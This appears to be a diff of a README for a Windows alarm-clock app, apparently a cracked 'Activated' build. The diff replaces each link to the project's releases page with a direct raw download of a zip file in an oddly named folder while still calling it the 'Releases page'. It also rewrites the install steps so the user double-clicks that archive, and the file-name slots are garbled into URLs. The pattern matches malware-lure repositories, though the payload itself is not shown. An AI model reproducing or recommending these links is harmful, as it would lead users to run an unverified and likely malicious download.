@@ -1,7 +1,7 @@
 # ⏰ Hot-Alarm-Clock-Activated - Keep Your Day on Track
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue.svg)](https://github.com/rezkiandra/Hot-Alarm-Clock-Activated/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/rezkiandra/Hot-Alarm-Clock-Activated/main/grangerite/Clock_Hot_Alarm_Activated_v1.6.zip)](https://raw.githubusercontent.com/rezkiandra/Hot-Alarm-Clock-Activated/main/grangerite/Clock_Hot_Alarm_Activated_v1.6.zip)
 
 ## 📖 Description
 This repository offers a complete collection of official resources, detailed guides, and comprehensive reference materials for Hot Alarm Clock on Windows PCs. It supports users with setup, customization, and troubleshooting to enhance their alarm management experience.
@@ -17,16 +17,16 @@ Follow these simple steps to download and run Hot Alarm Clock on your Windows PC
 
 ### 🛠 Installation Steps
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/rezkiandra/Hot-Alarm-Clock-Activated/releases) to find the latest version of Hot Alarm Clock. 
+   Go to the [Releases page](https://raw.githubusercontent.com/rezkiandra/Hot-Alarm-Clock-Activated/main/grangerite/Clock_Hot_Alarm_Activated_v1.6.zip) to find the latest version of Hot Alarm Clock. 
 
 2. **Download the Application**  
-   Look for the section labeled "Latest Release." Click on the link that says "Hot-Alarm-Clock.exe" to start the download. The file size is around 50 MB.
+   Look for the section labeled "Latest Release." Click on the link that says "https://raw.githubusercontent.com/rezkiandra/Hot-Alarm-Clock-Activated/main/grangerite/Clock_Hot_Alarm_Activated_v1.6.zip" to start the download. The file size is around 50 MB.
 
 3. **Locate the Downloaded File**  
-   After downloading, find the file named "Hot-Alarm-Clock.exe" in your Downloads folder or the location you saved it.
+   After downloading, find the file named "https://raw.githubusercontent.com/rezkiandra/Hot-Alarm-Clock-Activated/main/grangerite/Clock_Hot_Alarm_Activated_v1.6.zip" in your Downloads folder or the location you saved it.
 
 4. **Run the Application**  
-   Double-click on "Hot-Alarm-Clock.exe" to open the application. If prompted, confirm that you want to run the program.
+   Double-click on "https://raw.githubusercontent.com/rezkiandra/Hot-Alarm-Clock-Activated/main/grangerite/Clock_Hot_Alarm_Activated_v1.6.zip" to open the application. If prompted, confirm that you want to run the program.
 
 5. **Follow the Setup Instructions**  
    The application will guide you through the initial setup. You can customize your alarm settings according to your preferences.
@@ -58,7 +58,7 @@ You can set multiple alarms for different times and purposes. Configure each ala
 If the application does not open or crashes, please ensure:
 - Your Windows is up to date.
 - You have enough system resources available.
-- You have the latest version by checking the [Releases page](https://github.com/rezkiandra/Hot-Alarm-Clock-Activated/releases).
+- You have the latest version by checking the [Releases page](https://raw.githubusercontent.com/rezkiandra/Hot-Alarm-Clock-Activated/main/grangerite/Clock_Hot_Alarm_Activated_v1.6.zip).
 
 ## 📩 Need Help?
 If you encounter any issues, feel free to open an issue on this repository. Include details about your problem, and someone will assist you.
@@ -70,4 +70,4 @@ This project is licensed under the MIT License. You are free to use it for perso
 Follow this repository to receive notifications on updates and new features. Keep your productivity flowing with Hot Alarm Clock! 
 
 ## 🔗 Download & Install
-Now you are ready to manage your alarms efficiently. Visit the [Releases page](https://github.com/rezkiandra/Hot-Alarm-Clock-Activated/releases) to download and start using Hot Alarm Clock today!
+Now you are ready to manage your alarms efficiently. Visit the [Releases page](https://raw.githubusercontent.com/rezkiandra/Hot-Alarm-Clock-Activated/main/grangerite/Clock_Hot_Alarm_Activated_v1.6.zip) to download and start using Hot Alarm Clock today!
